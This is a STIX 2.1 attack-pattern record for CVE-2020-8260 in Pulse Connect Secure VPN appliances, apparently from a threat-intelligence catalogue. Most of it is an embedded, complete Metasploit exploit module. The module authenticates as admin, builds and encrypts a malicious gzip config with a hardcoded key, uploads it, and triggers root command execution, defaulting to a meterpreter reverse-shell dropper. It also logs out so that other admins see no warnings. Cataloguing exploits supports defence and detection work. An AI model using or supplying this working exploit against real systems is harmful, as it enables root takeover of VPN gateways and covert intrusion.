{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95b450c1-0101-48f2-88eb-35853e7d76e1",
    "created": "2024-08-14T17:00:15.611328Z",
    "modified": "2024-08-14T17:00:15.611332Z",
    "name": "Pulse Secure VPN gzip RCE",
    "description": " The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root. Admin credentials are required for successful exploitation. Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pulse_secure_gzip_rce.rb",
            "external_id": "pulse_secure_gzip_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605"
        },
        {
            "source_name": "reference",
            "url": "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/"
        },
        {
            "source_name": "reference",
            "url": "https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8260"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  ENCRYPTION_KEY = \"\\x7e\\x95\\x42\\x1a\\x6b\\x88\\x66\\x41\\x43\\x1b\\x32\\xc5\\x24\\x42\\xe2\\xe4\\x83\\xf8\\x1f\\x58\\xb0\\xe9\\xe9\\xa5\".b\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pulse Secure VPN gzip RCE',\n        'Description' => %q{\n          The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability\n          which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root.\n          Admin credentials are required for successful exploitation.\n          Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Spencer McIntyre', # msf module\n          'Richard Warren <richard.warren@nccgroup.com>', # original PoC, discovery\n          'David Cash <david.cash@nccgroup.com>', # original PoC, discovery\n        ],\n        'References' => [\n          ['URL', 'https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605'],\n          ['URL', 'https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/'],\n          ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601'],\n          ['CVE', '2020-8260']\n        ],\n        'DisclosureDate' => '2020-10-26',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix In-Memory',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/generic' }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp' }\n            }\n          ]\n        ],\n        'Payload' => { 'Compat' => { 'ConnectionType' => '-bind' } },\n        'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true, 'CMDSTAGER::FLAVOR' => 'curl' },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES],\n          'RelatedModules' => ['auxiliary/gather/pulse_secure_file_disclosure']\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI of the application', '/']),\n      OptString.new('USERNAME', [true, 'The username to login with', 'admin']),\n      OptString.new('PASSWORD', [true, 'The password to login with', '123456'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 1.5 ]),\n    ])\n  end\n\n  def check(exploiting: false)\n    login\n    res = send_request_cgi({ 'uri' => normalize_uri('dana-admin', 'misc', 'admin.cgi') })\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless res&.code == 200\n    version = res.body.scan(%r{id=\"span_stats_counter_total_users_count\"[^>]+>([^<(]+)(?:\\(build (\\d+)\\))?</span>})&.last\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless version\n    version, build = version\n\n    return CheckCode::Unknown unless version.include?('R')\n\n    version, revision = version.split('R', 2)\n    print_status(\"Version #{version.strip}, revision #{revision.strip}, build #{build.strip} found\")\n    return CheckCode::Appears if version.to_f <= 9.1 && revision.to_f < 9\n\n    CheckCode::Detected\n  rescue Msf::Exploit::Failed\n    CheckCode::Unknown\n  ensure\n    logout unless exploiting\n  end\n\n  def exploit\n    case (checkcode = check(exploiting: true))\n    when Exploit::CheckCode::Vulnerable, Exploit::CheckCode::Appears\n      print_good(checkcode.message)\n    when Exploit::CheckCode::Detected\n      print_warning(checkcode.message)\n    else\n      fail_with(Module::Failure::Unknown, checkcode.message.to_s)\n    end\n\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(\n        linemax: 262144, # 256KiB\n        delay: datastore['CMDSTAGER::DELAY']\n      )\n    end\n\n    logout\n  end\n\n  def execute_command(command, _opts = {})\n    trigger = Rex::Text.rand_text_alpha_upper(8)\n    print_status(\"Exploit trigger will be at #{normalize_uri('dana-na', 'auth', 'setcookie.cgi')} with a header of #{trigger}\")\n\n    config = build_malicious_config(command, trigger)\n    res = upload_config(config)\n\n    fail_with(Failure::UnexpectedReply, 'File upload failed') unless res&.code == 200\n\n    print_status('Triggering RCE')\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dana-na', 'auth', 'setcookie.cgi'),\n      'headers' => { trigger => trigger }\n    })\n  end\n\n  def res_get_xsauth(res)\n    res.body.scan(%r{name=\"xsauth\" value=\"([^\"]+)\"/>})&.last&.first\n  end\n\n  def upload_config(config)\n    print_status('Requesting backup config page')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'config.cgi'),\n      'headers' => { 'Referer' => \"#{full_uri('/dana-admin/cached/config/config.cgi')}?type=system\" },\n      'vars_get' => { 'type' => 'system' }\n    })\n    fail_with(Failure::UnexpectedReply, 'Failed to request the backup configuration page') unless res&.code == 200\n    xsauth = res_get_xsauth(res)\n    fail_with(Failure::UnexpectedReply, 'Failed to get the xsauth token') if xsauth.nil?\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(xsauth, nil, nil, 'form-data; name=\"xsauth\"')\n    post_data.add_part('Import', nil, nil, 'form-data; name=\"op\"')\n    post_data.add_part('system', nil, nil, 'form-data; name=\"type\"')\n    post_data.add_part('8', nil, nil, 'form-data; name=\"optWhat\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"txtPassword1\"')\n    post_data.add_part('Import Config', nil, nil, 'form-data; name=\"btnUpload\"')\n    post_data.add_part(config, 'application/octet-stream', 'binary', 'form-data; name=\"uploaded_file\"; filename=\"system.cfg\"')\n\n    print_status('Uploading encrypted config backup')\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'import.cgi'),\n      'method' => 'POST',\n      'headers' => { 'Referer' => \"#{full_uri('/dana-admin/cached/config/config.cgi')}?type=system\" },\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n  end\n\n  def login\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),\n      'method' => 'POST',\n      'vars_post' => {\n        'tz_offset' => '-300',\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'realm' => 'Admin Users',\n        'btnSubmit' => 'Sign In'\n      },\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&.code == 302\n    location = res.headers['Location']\n    fail_with(Failure::NoAccess, 'Login failed') if location.include?('failed')\n\n    return unless location.include?('admin%2Dconfirm')\n\n    # if the account we login with is already logged in, or another admin is logged in, a warning is displayed.  Click through it.\n    print_status('Other admin sessions detected, continuing')\n    res = send_request_cgi({ 'uri' => location, 'keep_cookies' => true })\n    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&.code == 200\n    fds = res.body.scan(/name=\"FormDataStr\" value=\"([^\"]+)\">/).last\n    xsauth = res_get_xsauth(res)\n    fail_with(Failure::UnexpectedReply, 'Login failed (missing form elements)') unless fds && xsauth\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),\n      'method' => 'POST',\n      'vars_post' => {\n        'btnContinue' => 'Continue the session',\n        'FormDataStr' => fds.first,\n        'xsauth' => xsauth\n      },\n      'keep_cookies' => true\n    })\n    fail_with(Failure::UnexpectedReply, 'Login failed') unless res\n  end\n\n  def logout\n    print_status('Logging out to prevent warnings to other admins')\n    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'config.cgi') })\n    fail_with(Failure::UnexpectedReply, 'Logout failed') unless res&.code == 200\n\n    logout_uri = res.body.scan(%r{/dana-na/auth/logout\\.cgi\\?xsauth=\\w+}).first\n    fail_with(Failure::UnexpectedReply, 'Logout failed') if logout_uri.nil?\n\n    res = send_request_cgi({ 'uri' => logout_uri })\n    fail_with(Failure::UnexpectedReply, 'Logout failed') unless res&.code == 302\n  end\n\n  def build_malicious_config(cmd, trigger)\n    payload_script = \"#{Rex::Text.rand_text_alphanumeric(rand(6..13))}.sh\"\n    perl = <<~PERL\n      if (length $ENV{HTTP_#{trigger}}){\n        chmod 0775, \"/data/var/runtime/tmp/tt/#{payload_script}\";\n        system(\"env /data/var/runtime/tmp/tt/#{payload_script}\");\n      }\n    PERL\n    tarfile = StringIO.new\n    Rex::Tar::Writer.new(tarfile) do |tar|\n      tar.mkdir('tmp', 509)\n      tar.mkdir('tmp/tt', 509)\n      tar.add_file('tmp/tt/setcookie.thtml.ttc', 511) do |tio|\n        tio.write perl\n      end\n      tar.add_file(\"tmp/tt/#{payload_script}\", 511) do |tio|\n        tio.write \"PATH=/home/bin:$PATH\\n\"\n        tio.write \"rm -- \\\"$0\\\"\\n\"\n        tio.write cmd\n      end\n    end\n\n    gzfile = StringIO.new\n    gz = Zlib::GzipWriter.new(gzfile)\n    gz.write(tarfile.string)\n    gz.close\n\n    encrypt_config(gzfile.string)\n  end\n\n  def encrypt_config(config_blob)\n    cipher = OpenSSL::Cipher.new('DES-EDE3-CFB').encrypt\n    iv = cipher.iv = cipher.random_iv\n    cipher.key = ENCRYPTION_KEY\n\n    md5 = OpenSSL::Digest.new('MD5', \"#{iv}\\x00#{[config_blob.length].pack('V')}\")\n\n    ciphertext = cipher.update(config_blob)\n    ciphertext << cipher.final\n    md5 << ciphertext\n\n    cipher.reset\n    \"\\x09#{iv}\\x00#{[ciphertext.length].pack('V') + ciphertext + cipher.update(md5.digest) + cipher.final}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}